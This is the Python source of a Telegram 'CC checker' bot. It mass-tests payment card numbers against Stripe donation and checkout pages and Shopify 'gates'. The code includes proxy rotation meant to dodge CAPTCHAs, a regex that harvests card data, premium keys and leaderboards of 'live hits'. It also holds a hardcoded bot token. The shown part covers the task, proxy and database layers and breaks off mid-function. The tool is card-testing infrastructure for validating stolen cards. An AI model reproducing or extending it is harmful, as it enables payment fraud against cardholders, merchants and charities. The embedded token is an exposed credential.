#!/usr/bin/env python3
"""
H CC CHECKER BOT
Multi-Gate Engine

A Telegram CC checker bot with multi-gate integration.
Features: Mass checking, BIN lookup, user management, and more.

Author: Hassan
"""

import asyncio
import json
import time
import random
import string
import aiohttp
from aiohttp import web
from curl_cffi.requests import AsyncSession
import re
import sqlite3
import warnings
import os
import uuid
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from typing import Dict, List, Tuple, Optional
from html import unescape
from urllib.parse import urlparse
from collections import defaultdict

warnings.filterwarnings("ignore", category=DeprecationWarning)

# ═══════════════════════════════════════════════════════════════
#                         CONFIGURATION
# ═══════════════════════════════════════════════════════════════

BOT_TOKEN = "7993577146:AAH3q16SP9Wf6vT0FUiuLT1lodNCutZVk_c"
BOT_NAME = "C/C Checker"
BOT_USERNAME = "PotaoesIsTastybot"
OWNER_USERNAME = "u_b1t"
OWNER_ID = None  # Will be set on first owner interaction


# Rate limiting
MAX_CHECKS_PER_MINUTE = 10
CHECK_COOLDOWN = 3  # seconds between checks

# BIN API (free)
BIN_API_URL = "https://bins.antipublic.cc/bins/"

# Telegram message limit
TELEGRAM_MSG_LIMIT = 4000  # Leave buffer from 4096

# Gates pagination
GATES_PER_PAGE = 10

# ═══════════════════════════════════════════════════════════════
#                      TASK MANAGER
# ═══════════════════════════════════════════════════════════════

class TaskManager:
    """Manages active mass check tasks with cancellation support"""

    def __init__(self):
        self._tasks: Dict[str, dict] = {}  # taskid -> task info
        self._lock = asyncio.Lock()

    def _generate_id(self) -> str:
        """Generate GUID-style task ID"""
        return str(uuid.uuid4())[:8].upper()

    async def register(self, user_id: int, gate_cmd: str, total: int) -> Tuple[str, asyncio.Event]:
        """Register a new task and return (taskid, cancel_event)"""
        async with self._lock:
            task_id = self._generate_id()
            cancel_event = asyncio.Event()
            self._tasks[task_id] = {
                'user_id': user_id,
                'gate_cmd': gate_cmd,
                'total': total,
                'processed': 0,
                'cancel_event': cancel_event,
                'start_time': time.time()
            }
            return task_id, cancel_event

    async def update_progress(self, task_id: str, processed: int):
        """Update task progress"""
        async with self._lock:
            if task_id in self._tasks:
                self._tasks[task_id]['processed'] = processed

    async def get_task(self, task_id: str) -> Optional[dict]:
        """Get task info by ID"""
        async with self._lock:
            return self._tasks.get(task_id)

    async def cancel(self, task_id: str) -> bool:
        """Cancel a task by setting its cancel event"""
        async with self._lock:
            if task_id in self._tasks:
                self._tasks[task_id]['cancel_event'].set()
                return True
            return False

    async def unregister(self, task_id: str):
        """Remove task from registry"""
        async with self._lock:
            self._tasks.pop(task_id, None)

    async def get_user_tasks(self, user_id: int) -> List[Tuple[str, dict]]:
        """Get all active tasks for a user"""
        async with self._lock:
            return [(tid, info) for tid, info in self._tasks.items() if info['user_id'] == user_id]

    async def get_all_tasks(self) -> List[Tuple[str, dict]]:
        """Get all active tasks"""
        async with self._lock:
            return list(self._tasks.items())

# Global task manager instance
task_manager = TaskManager()

# ═══════════════════════════════════════════════════════════════
#                      PROXY MANAGER
# ═══════════════════════════════════════════════════════════════

# Max consecutive failures before marking proxy as dead
PROXY_MAX_FAILS = 3
# Check proxy health every X minutes
PROXY_CHECK_INTERVAL = 30

class ProxyManager:
    """Manages proxy settings per user with database persistence and health checks"""

    def __init__(self):
        self._cache: Dict[int, dict] = {}  # In-memory cache for fast access
        self._lock = asyncio.Lock()
        self._health_check_task = None
        self._users_to_notify: Dict[int, str] = {}  # user_id -> reason

    async def set_proxy(self, user_id: int, proxy_url: str, proxy_info: dict):
        """Set proxy for a user (saves to DB and cache)"""
        async with self._lock:
            # Save to database
            db.save_proxy(user_id, proxy_url, proxy_info)
            # Update cache
            self._cache[user_id] = {
                'url': proxy_url,
                'info': proxy_info,
                'set_at': time.time()
            }

    async def get_proxy(self, user_id: int) -> Optional[dict]:
        """Get proxy for a user (from cache or DB)"""
        async with self._lock:
            # Check cache first
            if user_id in self._cache:
                return self._cache[user_id]
            # Fallback to database
            proxy_data = db.get_user_proxy(user_id)
            if proxy_data:
                self._cache[user_id] = {
                    'url': proxy_data['url'],
                    'info': proxy_data,
                    'set_at': time.time()
                }
                return self._cache[user_id]
            return None

    async def get_proxy_url(self, user_id: int) -> Optional[str]:
        """Get just the proxy URL for a user"""
        async with self._lock:
            # Check cache first
            if user_id in self._cache:
                return self._cache[user_id]['url']
            # Fallback to database
            return db.get_proxy_url(user_id)

    async def clear_proxy(self, user_id: int) -> bool:
        """Clear proxy for a user"""
        async with self._lock:
            db.delete_proxy(user_id)
            if user_id in self._cache:
                del self._cache[user_id]
                return True
            return False

    async def has_proxy(self, user_id: int) -> bool:
        """Check if user has a proxy set"""
        async with self._lock:
            if user_id in self._cache:
                return True
            return db.get_proxy_url(user_id) is not None

    async def mark_proxy_failed(self, user_id: int) -> int:
        """Mark proxy as failed, return new fail count"""
        fail_count = db.increment_proxy_fail(user_id)
        if fail_count >= PROXY_MAX_FAILS:
            db.update_proxy_status(user_id, 'DEAD', fail_count)
            # Schedule notification
            self._users_to_notify[user_id] = 'Proxy failed multiple times'
        return fail_count

    async def mark_proxy_success(self, user_id: int):
        """Mark proxy as successful (reset fail count)"""
        db.reset_proxy_fail(user_id)

    async def get_pending_notifications(self) -> Dict[int, str]:
        """Get and clear pending notifications"""
        async with self._lock:
            notifications = self._users_to_notify.copy()
            self._users_to_notify.clear()
            return notifications

    async def check_proxy_health(self, user_id: int, proxy_url: str) -> bool:
        """Check if a specific proxy is still working"""
        try:
            result = await validate_proxy(proxy_url)
            if result['valid']:
                await self.mark_proxy_success(user_id)
                return True
            else:
                fail_count = await self.mark_proxy_failed(user_id)
                return False
        except Exception:
            fail_count = await self.mark_proxy_failed(user_id)
            return False

    async def run_health_checks(self):
        """Run health checks on stale proxies"""
        stale_proxies = db.get_stale_proxies(PROXY_CHECK_INTERVAL)
        for user_id, proxy_url, fail_count in stale_proxies:
            if fail_count < PROXY_MAX_FAILS:
                await self.check_proxy_health(user_id, proxy_url)
            await asyncio.sleep(1)  # Rate limit

    def start_health_check_loop(self):
        """Start background health check loop"""
        async def health_loop():
            while True:
                try:
                    await asyncio.sleep(PROXY_CHECK_INTERVAL * 60)  # Convert to seconds
                    await self.run_health_checks()
                except Exception as e:
                    print(f"[PROXY] Health check error: {e}")
                    await asyncio.sleep(60)

        self._health_check_task = asyncio.create_task(health_loop())

    def get_proxy_status_emoji(self, fail_count: int) -> str:
        """Get status emoji based on fail count"""
        if fail_count == 0:
            return "✅"
        elif fail_count < PROXY_MAX_FAILS:
            return "⚠️"
        else:
            return "❌"

# Global proxy manager instance
proxy_manager = ProxyManager()

# IP Check APIs for proxy validation
IP_CHECK_APIS = [
    "https://api.ipify.org?format=json",
    "https://httpbin.org/ip",
    "https://api.myip.com"
]

# IP Geolocation API
IP_GEO_API = "http://ip-api.com/json/"

async def validate_proxy(proxy_url: str) -> dict:
    """
    Validate proxy and check if it's rotating or static
    Returns dict with: valid, is_rotating, ip, country, response_time, error
    """
    result = {
        'valid': False,
        'is_rotating': False,
        'ip': None,
        'country': None,
        'country_code': None,
        'response_time': 0,
        'error': None
    }

    # Parse proxy URL to ensure it's valid format
    # Supports: http://ip:port, http://user:pass@ip:port, socks5://ip:port
    try:
        if not proxy_url.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            proxy_url = 'http://' + proxy_url

        # First request to get IP
        start_time = time.time()
        ip1 = None

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Try to get IP through proxy
            try:
                async with session.get(
                    "https://api.ipify.org?format=json",
                    proxy=proxy_url,
                    ssl=False
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        ip1 = data.get('ip')
                        result['response_time'] = round(time.time() - start_time, 2)
            except Exception as e:
                # Try alternative API
                try:
                    async with session.get(
                        "https://httpbin.org/ip",
                        proxy=proxy_url,
                        ssl=False
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            ip1 = data.get('origin', '').split(',')[0].strip()
                            result['response_time'] = round(time.time() - start_time, 2)
                except:
                    result['error'] = 'Connection failed'
                    return result

            if not ip1:
                result['error'] = 'Could not get IP'
                return result

            result['ip'] = ip1
            result['valid'] = True

            # Get geolocation
            try:
                async with session.get(f"{IP_GEO_API}{ip1}", timeout=aiohttp.ClientTimeout(total=10)) as geo_resp:
                    if geo_resp.status == 200:
                        geo_data = await geo_resp.json()
                        result['country'] = geo_data.get('country', 'Unknown')
                        result['country_code'] = geo_data.get('countryCode', 'XX')
            except:
                result['country'] = 'Unknown'
                result['country_code'] = 'XX'

        # Second request with FRESH connection to check rotation
        # Many rotating proxies only rotate on new connections, not within same session
        await asyncio.sleep(0.5)
        ip2 = None

        # Create fresh connector with force_close to ensure new connection
        connector2 = aiohttp.TCPConnector(ssl=False, force_close=True)
        timeout2 = aiohttp.ClientTimeout(total=15)

        async with aiohttp.ClientSession(connector=connector2, timeout=timeout2) as session2:
            try:
                async with session2.get(
                    "https://api.ipify.org?format=json",
                    proxy=proxy_url,
                    ssl=False
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        ip2 = data.get('ip')
            except:
                try:
                    async with session2.get(
                        "https://httpbin.org/ip",
                        proxy=proxy_url,
                        ssl=False
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            ip2 = data.get('origin', '').split(',')[0].strip()
                except:
                    pass

        # Check if IPs are different (rotating proxy)
        if ip2 and ip1 != ip2:
            result['is_rotating'] = True
        else:
            result['is_rotating'] = False

        return result

    except Exception as e:
        result['error'] = str(e)[:50]
        return result

def get_country_emoji(country_code: str) -> str:
    """Get flag emoji from country code"""
    if not country_code or len(country_code) != 2:
        return "🌍"
    try:
        return ''.join(chr(ord(c) + 127397) for c in country_code.upper())
    except:
        return "🌍"

def parse_proxy_input(proxy_input: str) -> str:
    """
    Parse various proxy input formats and convert to standard URL format

    Supported formats:
    1. ip:port                          -> http://ip:port
    2. ip:port:user:pass                -> http://user:pass@ip:port
    3. user:pass@ip:port                -> http://user:pass@ip:port
    4. http://ip:port                   -> http://ip:port
    5. http://user:pass@ip:port         -> http://user:pass@ip:port
    6. socks5://ip:port                 -> socks5://ip:port
    7. socks5://user:pass@ip:port       -> socks5://user:pass@ip:port
    """
    proxy_input = proxy_input.strip()

    # Already has protocol
    if proxy_input.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return proxy_input

    # Check if it's user:pass@ip:port format (has @ symbol)
    if '@' in proxy_input:
        return 'http://' + proxy_input

    # Check if it's ip:port:user:pass format (4 parts separated by :)
    parts = proxy_input.split(':')

    if len(parts) == 4:
        # Format: ip:port:user:pass
        ip, port, user, password = parts
        return f'http://{user}:{password}@{ip}:{port}'
    elif len(parts) == 2:
        # Format: ip:port
        return 'http://' + proxy_input
    elif len(parts) == 3:
        # Could be ip:port:user (incomplete) or something else
        # Treat as ip:port with extra part ignored, or just add http://
        return 'http://' + proxy_input
    else:
        # Unknown format, just prepend http://
        return 'http://' + proxy_input

def format_proxy_result(proxy_info: dict) -> str:
    """Format proxy validation result for display"""
    if not proxy_info['valid']:
        return f"""❌ Proxy Validation Failed!

━━━━━━━━━━━━━━━━━━━━━━━━━━
• 𝗦𝘁𝗮𝘁𝘂𝘀: ❌ DEAD
• 𝗘𝗿𝗿𝗼𝗿: {proxy_info.get('error', 'Unknown error')}
━━━━━━━━━━━━━━━━━━━━━━━━━━"""

    status = "✅ LIVE"
    rotation = "✅ Rotating" if proxy_info['is_rotating'] else "❌ Static"
    country_emoji = get_country_emoji(proxy_info.get('country_code', 'XX'))

    response = f"""✅ Proxy Validated and Saved!

━━━━━━━━━━━━━━━━━━━━━━━━━━
• 𝗦𝘁𝗮𝘁𝘂𝘀: {status}
• 𝗥𝗼𝘁𝗮𝘁𝗶𝗼𝗻: {rotation}
• 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {proxy_info['response_time']}s
• 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_emoji} {proxy_info['country']}
• 𝗜𝗣: {proxy_info['ip']}
━━━━━━━━━━━━━━━━━━━━━━━━━━"""

    # Add warning for static proxies
    if not proxy_info['is_rotating']:
        response += """

⚠️ Warning: This proxy is NOT rotating!
Non-rotating proxies may result in bad hits and CAPTCHAs."""

    return response

# ═══════════════════════════════════════════════════════════════
#                      MESSAGE TEMPLATES
# ═══════════════════════════════════════════════════════════════

BANNER = """<b>[ CC CHECKER ]</b>"""

MINI_BANNER = "<b>CC CHK</b>"

def format_card_display(card_num: str, mm: int = 0, yy: int = 0, cvv: str = "", full=True) -> str:
    """Format card for display in CC|MM|YY|CVV format"""
    if full and mm and yy and cvv:
        yy_short = yy % 100 if yy >= 2000 else yy
        return f"{card_num}|{mm:02d}|{yy_short}|{cvv}"
    return card_num

def get_card_brand(card_num: str) -> str:
    """Detect card brand from number"""
    num = card_num.replace(" ", "")
    if num.startswith("4"):
        return "VISA"
    elif num.startswith(("51", "52", "53", "54", "55")) or (2221 <= int(num[:4]) <= 2720):
        return "MASTERCARD"
    elif num.startswith(("34", "37")):
        return "AMEX"
    elif num.startswith("6011") or num.startswith("65"):
        return "DISCOVER"
    elif num.startswith(("300", "301", "302", "303", "304", "305", "36", "38")):
        return "DINERS"
    elif num.startswith("35"):
        return "JCB"
    else:
        return "UNKNOWN"

def get_status_emoji(status: str, is_chargeable=None) -> str:
    """Get emoji for status"""
    # Check for Approved statuses first
    if status.startswith('Approved') or 'CCN' in status:
        return '✅'
    if status == '2FACTOR' or '3DS' in status:
        return '✅'
    if status == 'CHARGED' or is_chargeable is True:
        return '🔥'
    if is_chargeable is False or status in ['DECLINED', 'EXPIRED', 'NSF', 'INVALID', 'FRAUD', 'FAILED', 'CARD_DECLINED']:
        return '❌'
    # Gateway errors - not card issues
    if status in ['CHECKOUT_FAILED', 'ERROR', 'GATEWAY_ERROR', 'CAPTCHA']:
        return '⚠️'
    # Neutral statuses
    if status in ['RETRY', 'BAN', 'THROTTLED']:
        return '⚠️'
    return '🔥' if is_chargeable else '❌'

def is_gateway_error(status: str, message: str = "") -> bool:
    """Check if the status indicates a site issue (not a card decline)"""
    # RETRY status with PROCESSING_TIMEOUT is NOT a site error - bank is still processing
    if status == 'RETRY' and 'processing' in message.lower():
        return False

    # CAPTCHA status is a site error (detected in final API response)
    if status == 'CAPTCHA':
        return True

    site_error_statuses = ['CHECKOUT_FAILED', 'ERROR', 'GATEWAY_ERROR', 'TIMEOUT']
    site_error_messages = [
        'checkout failed', 'blocked', 'rate limit', 'connection',
        'incompatible', 'spa checkout', 'custom domain', 'password', 'no_session_token',
        'no_products', 'proposal_failed', 'token_failed', 'delivery_stale', 'delivery details',
        'captcha_required'
    ]

    if status in site_error_statuses:
        return True

    msg_lower = message.lower()
    for err in site_error_messages:
        if err in msg_lower:
            return True

    return False

def is_valid_gateway_response(status: str, message: str = "", result: dict = None) -> bool:
    """Check if response is valid (DECLINED, APPROVED/CCN, CHARGED, 3DS)"""
    result = result or {}
    msg_upper = message.upper()
    status_upper = status.upper()

    # DECLINED
    is_declined = status_upper == 'DECLINED' or 'DECLINE' in msg_upper or 'CARD_DECLINED' in msg_upper
    # 3DS
    is_3ds = status == '2FACTOR' or '3D' in status_upper
    # CHARGED
    is_charged = result.get('success') or status_upper == 'CHARGED'
    # APPROVED/CCN
    is_approved = result.get('is_chargeable') is True or status.startswith('Approved') or 'CCN' in status_upper

    return is_declined or is_3ds or is_charged or is_approved

def format_time(seconds: float) -> str:
    """Format time in seconds"""
    return f"{seconds:.2f}s"

# Command prefixes supported
CMD_PREFIXES = ['/', '.', '!', '"']

# CC extraction regex - matches CC|MM|YY|CVV patterns
CC_PATTERN = re.compile(r'\b(\d{13,19})[|\s/:;,\-](\d{1,2})[|\s/:;,\-](\d{2,4})[|\s/:;,\-](\d{3,4})\b')

def extract_cards_from_text(text: str) -> List[Dict]:
    """Extract all valid CC|MM|YY|CVV cards from any text"""
    cards = []
    matches = CC_PATTERN.findall(text)
    for match in matches:
        card_num, mm, yy, cvv = match
        try:
            month = int(mm)
            year = int(yy)
            if year < 100:
                year += 2000
            # Accept any reasonable expiry year (past years may still be valid for testing)
            if 1 <= month <= 12 and len(cvv) in [3, 4]:
                if luhn_check(card_num):
                    cards.append({
                        'number': card_num,
                        'month': month,
                        'year': year,
                        'cvv': cvv
                    })
        except:
            continue
    return cards

def make_progress_bar(current: int, total: int, bar_length: int = 15) -> str:
    """Create a visual progress bar"""
    if total == 0:
        return "[" + "░" * bar_length + "]"
    percent = current / total
    filled = int(bar_length * percent)
    empty = bar_length - filled
    bar = "█" * filled + "░" * empty
    pct = int(percent * 100)
    return f"[{bar}] {pct}%"

def is_command_with_prefix(text: str) -> Tuple[bool, str, str]:
    """Check if text starts with any command prefix and extract command + args"""
    if not text:
        return False, "", ""
    for prefix in CMD_PREFIXES:
        if text.startswith(prefix):
            parts = text[len(prefix):].split(maxsplit=1)
            cmd = parts[0] if parts else ""
            args = parts[1] if len(parts) > 1 else ""
            return True, cmd.lower(), args
    return False, "", ""

# ═══════════════════════════════════════════════════════════════
#                         DATABASE
# ═══════════════════════════════════════════════════════════════

class Database:
    def __init__(self):
        self.conn = sqlite3.connect('H.db', check_same_thread=False)
        self.create_tables()

    def create_tables(self):
        c = self.conn.cursor()

        # Gateways table
        c.execute('''CREATE TABLE IF NOT EXISTS gateways (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            site_url TEXT UNIQUE NOT NULL,
            command_name TEXT UNIQUE NOT NULL,
            product_id TEXT,
            product_price TEXT,
            product_title TEXT,
            date_added TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            is_active INTEGER DEFAULT 1,
            total_checks INTEGER DEFAULT 0,
            live_count INTEGER DEFAULT 0,
            dead_count INTEGER DEFAULT 0,
            owner_id INTEGER
        )''')

        # Migration: add owner_id column if it doesn't exist
        c.execute("PRAGMA table_info(gateways)")
        columns = [col[1] for col in c.fetchall()]
        if 'owner_id' not in columns:
            c.execute('ALTER TABLE gateways ADD COLUMN owner_id INTEGER')
        if 'gate_type' not in columns:
            c.execute('ALTER TABLE gateways ADD COLUMN gate_type TEXT DEFAULT "shopify"')

        # Users table
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            role TEXT DEFAULT 'user',
            credits INTEGER DEFAULT 100,
            total_checks INTEGER DEFAULT 0,
            live_hits INTEGER DEFAULT 0,
            dead_hits INTEGER DEFAULT 0,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            is_banned INTEGER DEFAULT 0
        )''')

        # Check history
        c.execute('''CREATE TABLE IF NOT EXISTS check_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            card_bin TEXT,
            card_last4 TEXT,
            gateway TEXT,
            status TEXT,
            response TEXT,
            check_time REAL,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

        # Banned users
        c.execute('''CREATE TABLE IF NOT EXISTS banned_users (
            user_id INTEGER PRIMARY KEY,
            banned_by INTEGER,
            reason TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

        # Premium keys table
        c.execute('''CREATE TABLE IF NOT EXISTS premium_keys (
            key_code TEXT PRIMARY KEY,
            duration_days INTEGER DEFAULT 30,
            created_by INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            redeemed_by INTEGER,
            redeemed_at TIMESTAMP,
            is_used INTEGER DEFAULT 0
        )''')

        # User premium expiry
        c.execute('''CREATE TABLE IF NOT EXISTS user_premium (
            user_id INTEGER PRIMARY KEY,
            expires_at TIMESTAMP,
            granted_by INTEGER
        )''')

        # User proxies table - persistent proxy storage
        c.execute('''CREATE TABLE IF NOT EXISTS user_proxies (
            user_id INTEGER PRIMARY KEY,
            proxy_url TEXT NOT NULL,
            proxy_ip TEXT,
            proxy_country TEXT,
            proxy_country_code TEXT,
            is_rotating INTEGER DEFAULT 0,
            response_time REAL,
            last_check TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_status TEXT DEFAULT 'LIVE',
            fail_count INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

        self.conn.commit()

    # ─────────────────── Gateway Methods ───────────────────

    def add_gateway(self, url, cmd, prod_id, price, title, owner_id=None, gate_type="shopify"):
        c = self.conn.cursor()
        # Check if there's an inactive gateway with this URL (was deleted before)
        c.execute('SELECT id FROM gateways WHERE site_url = ? AND is_active = 0', (url,))
        existing = c.fetchone()
        if existing:
            # Reactivate and update the gateway
            c.execute('''UPDATE gateways SET
                         command_name = ?, product_id = ?, product_price = ?,
                         product_title = ?, owner_id = ?, gate_type = ?, is_active = 1,
                         total_checks = 0, live_count = 0, dead_count = 0
                         WHERE id = ?''',
                      (cmd, prod_id, price, title, owner_id, gate_type, existing[0]))
            self.conn.commit()
            return True
        # Check if there's already an active gateway with this command name
        c.execute('SELECT id FROM gateways WHERE LOWER(command_name) = LOWER(?) AND is_active = 1', (cmd,))
        if c.fetchone():
            return False
        try:
            c.execute('''INSERT INTO gateways
                         (site_url, command_name, product_id, product_price, product_title, owner_id, gate_type)
                         VALUES (?, ?, ?, ?, ?, ?, ?)''',
                      (url, cmd, prod_id, price, title, owner_id, gate_type))
            self.conn.commit()
            return True
        except sqlite3.IntegrityError:
            return False

    def init_stripe_gates(self):
        """Initialize Stripe gates"""
        # str1 - Alayn International
        self.add_gateway(
            url="stripe_checkout",
            cmd="str1",
            prod_id=None,
            price="$1",
            title="Stripe Checkout",
            owner_id=None,
            gate_type="stripe_checkout"
        )
        # str2 - Second Stork
        self.add_gateway(
            url="stripe_secondstork",
            cmd="str2",
            prod_id=None,
            price="$5",
            title="Stripe SecondStork",
            owner_id=None,
            gate_type="stripe_secondstork"
        )
        self.add_gateway(
            url="stripe_donation",
            cmd="str4",
            prod_id=None,
            price="$3",
            title="Stripe Donation (David Maraga)",
            owner_id=None,
            gate_type="stripe_donation"
        )
        self.add_gateway(
            url="stripe_auth",
            cmd="str",
            prod_id=None,
            price="$0",
            title="Stripe Auth (Propski)",
            owner_id=None,
            gate_type="stripe_auth"
        )
        self.add_gateway(
            url="stripe_dollar",
            cmd="str5",
            prod_id=None,
            price="$1",
            title="Stripe $1 (OnaM)",
            owner_id=None,
            gate_type="stripe_dollar"
        )

    
    def get_all_gateways(self):
        c = self.conn.cursor()
        c.execute('''SELECT site_url, command_name, product_price, product_title,
                            total_checks, live_count, dead_count, owner_id, product_id, gate_type
                     FROM gateways WHERE is_active = 1 ORDER BY live_count DESC''')
        return c.fetchall()

    def get_gateway_by_cmd(self, cmd):
        c = self.conn.cursor()
        # Case-insensitive search
        c.execute('''SELECT site_url, product_id, product_price, product_title, gate_type
                     FROM gateways WHERE LOWER(command_name) = LOWER(?) AND is_active = 1''', (cmd,))
        return c.fetchone()

    def get_gateway_owner(self, cmd):
        """Get the owner_id of a gateway by command name. Returns (exists, owner_id) tuple."""
        c = self.conn.cursor()
        # Case-insensitive search
        c.execute('SELECT owner_id FROM gateways WHERE LOWER(command_name) = LOWER(?) AND is_active = 1', (cmd,))
        row = c.fetchone()
        if row is None:
            return (False, None)  # Gateway doesn't exist
        return (True, row[0])  # Gateway exists, return owner (may be None)

    def get_user_gateways(self, user_id):
        """Get all gateways owned by a specific user"""
        c = self.conn.cursor()
        c.execute('''SELECT command_name, site_url, product_price, product_title,
                            total_checks, live_count, dead_count
                     FROM gateways WHERE owner_id = ? AND is_active = 1 ORDER BY live_count DESC''',
                  (user_id,))
        return c.fetchall()

    def remove_gateway(self, cmd):
        c = self.conn.cursor()
        # Case-insensitive delete
        c.execute('UPDATE gateways SET is_active = 0 WHERE LOWER(command_name) = LOWER(?)', (cmd,))
        self.conn.commit()
        return c.rowcount > 0

    def update_gateway(self, cmd, price=None, title=None, url=None):
        """Update gateway details (price, title, or url)"""
        c = self.conn.cursor()
        updates = []
        values = []
        if price is not None:
            updates.append('product_price = ?')
            values.append(price)
        if title is not None:
            updates.append('product_title = ?')
            values.append(title)
        if url is not None:
            updates.append('site_url = ?')
            values.append(url)
        if not updates:
            return False
        values.append(cmd)
        c.execute(f'UPDATE gateways SET {", ".join(updates)} WHERE command_name = ? AND is_active = 1', values)
        self.conn.commit()
        return c.rowcount > 0

    def update_gateway_stats(self, cmd, is_live):
        c = self.conn.cursor()
        # Case-insensitive update
        if is_live:
            c.execute('UPDATE gateways SET total_checks = total_checks + 1, live_count = live_count + 1 WHERE LOWER(command_name) = LOWER(?)', (cmd,))
        else:
            c.execute('UPDATE gateways SET total_checks = total_checks + 1, dead_count = dead_count + 1 WHERE LOWER(command_name) = LOWER(?)', (cmd,))
        self.conn.commit()

    def get_gateway_count(self):
        c = self.conn.cursor()
        c.execute('SELECT COUNT(*) FROM gateways WHERE is_active = 1')
        return c.fetchone()[0]

    # ─────────────────── User Methods ───────────────────

    def get_or_create_user(self, user_id, username=None, first_name=None):
        c = self.conn.cursor()
        c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        row = c.fetchone()
        if not row:
            c.execute('''INSERT INTO users (user_id, username, first_name) VALUES (?, ?, ?)''',
                      (user_id, username, first_name))
            self.conn.commit()
            return {'role': 'user', 'credits': 100, 'total_checks': 0, 'live_hits': 0, 'dead_hits': 0}
        return {
            'role': row[3],
            'credits': row[4],
            'total_checks': row[5],
            'live_hits': row[6],
            'dead_hits': row[7]
        }

    def update_user_stats(self, user_id, is_live):
        c = self.conn.cursor()
        if is_live:
            c.execute('''UPDATE users SET
                         total_checks = total_checks + 1,
                         live_hits = live_hits + 1,
                         last_active = CURRENT_TIMESTAMP
                         WHERE user_id = ?''', (user_id,))
        else:
            c.execute('''UPDATE users SET
                         total_checks = total_checks + 1,
                         dead_hits = dead_hits + 1,
                         last_active = CURRENT_TIMESTAMP
                         WHERE user_id = ?''', (user_id,))
        self.conn.commit()

    def get_user_stats(self, user_id):
        c = self.conn.cursor()
        c.execute('''SELECT username, role, credits, total_checks, live_hits, dead_hits, first_seen
                     FROM users WHERE user_id = ?''', (user_id,))
        row = c.fetchone()
        if row:
            return {
                'username': row[0],
                'role': row[1],
                'credits': row[2],
                'total_checks': row[3],
                'live_hits': row[4],
                'dead_hits': row[5],
                'first_seen': row[6]
            }
        return None

    def get_leaderboard(self, limit=10):
        c = self.conn.cursor()
        c.execute('''SELECT username, live_hits, total_checks
                     FROM users
                     WHERE is_banned = 0 AND total_checks > 0
                     ORDER BY live_hits DESC
                     LIMIT ?''', (limit,))
        return c.fetchall()

    def get_total_users(self):
        c = self.conn.cursor()
        c.execute('SELECT COUNT(*) FROM users')
        return c.fetchone()[0]

    def ban_user(self, user_id, banned_by, reason="No reason"):
        c = self.conn.cursor()
        c.execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (user_id,))
        c.execute('INSERT OR REPLACE INTO banned_users (user_id, banned_by, reason) VALUES (?, ?, ?)',
                  (user_id, banned_by, reason))
        self.conn.commit()

    def unban_user(self, user_id):
        c = self.conn.cursor()
        c.execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (user_id,))
        c.execute('DELETE FROM banned_users WHERE user_id = ?', (user_id,))
        self.conn.commit()

    def is_banned(self, user_id):
        c = self.conn.cursor()
        c.execute('SELECT is_banned FROM users WHERE user_id = ?', (user_id,))
        row = c.fetchone()
        return row[0] == 1 if row else False

    # ─────────────────── History Methods ───────────────────

    def add_check_history(self, user_id, card_bin, card_last4, gateway, status, response, check_time):
        c = self.conn.cursor()
        c.execute('''INSERT INTO check_history
                     (user_id, card_bin, card_last4, gateway, status, response, check_time)
                     VALUES (?, ?, ?, ?, ?, ?, ?)''',
                  (user_id, card_bin, card_last4, gateway, status, response, check_time))
        self.conn.commit()

    def get_user_history(self, user_id, limit=10):
        c = self.conn.cursor()
        c.execute('''SELECT card_bin, card_last4, gateway, status, check_time, timestamp
                     FROM check_history
                     WHERE user_id = ?
                     ORDER BY timestamp DESC
                     LIMIT ?''', (user_id, limit))
        return c.fetchall()

    def get_total_checks_today(self):
        c = self.conn.cursor()
        c.execute('''SELECT COUNT(*) FROM check_history
                     WHERE DATE(timestamp) = DATE('now')''')
        return c.fetchone()[0]

    def get_live_today(self):
        c = self.conn.cursor()
        c.execute('''SELECT COUNT(*) FROM check_history
                     WHERE DATE(timestamp) = DATE('now') AND status IN ('CHARGED', 'APPROVED', '3DS', 'CCN', 'AVS')''')
        return c.fetchone()[0]

    # ─────────────────── Premium Key Methods ───────────────────

    def generate_key(self, duration_days: int, created_by: int) -> str:
        """Generate a premium key"""
        key_code = f"PROO-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
        c = self.conn.cursor()
        c.execute('''INSERT INTO premium_keys (key_code, duration_days, created_by) VALUES (?, ?, ?)''',
                  (key_code, duration_days, created_by))
        self.conn.commit()
        return key_code

    def redeem_key(self, key_code: str, user_id: int) -> Tuple[bool, str]:
        """Redeem a premium key"""
        c = self.conn.cursor()
        c.execute('SELECT duration_days, is_used FROM premium_keys WHERE key_code = ?', (key_code,))
        row = c.fetchone()
        if not row:
            return False, "Invalid key"
        if row[1] == 1:
            return False, "Key already redeemed"

        duration_days = row[0]

        # Check current premium status
